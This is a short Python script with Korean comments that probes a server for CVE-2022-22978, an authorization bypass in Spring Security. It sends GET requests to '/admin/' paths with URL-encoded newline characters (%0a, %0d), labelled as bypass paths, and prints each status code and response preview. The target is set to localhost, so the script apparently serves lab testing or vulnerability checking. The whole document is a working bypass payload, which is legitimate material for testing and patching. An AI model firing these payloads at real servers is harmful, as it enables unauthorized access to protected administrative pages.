import requests

# 대상 서버 주소
target = "http://localhost:8080"

# 테스트 경로 목록
test_paths = [
    "/admin/",
    "/admin/%0atest",  # 우회 경로 1
    "/admin/%0dtest",  # 우회 경로 2
]

print("[*] Testing for CVE-2022-22978...\n")

for path in test_paths:
    url = target + path
    print("=" * 60)
    print(f"[+] Request URL: {url}")
    try:
        res = requests.get(url, timeout=5)
        print(f"    Status Code: {res.status_code}")
        print("    Response Body (preview):")
        print(res.text[:300] + ("\n" if len(res.text) > 0 else "[No Content]"))
    except Exception as e:
        print(f"    Error: {e}")
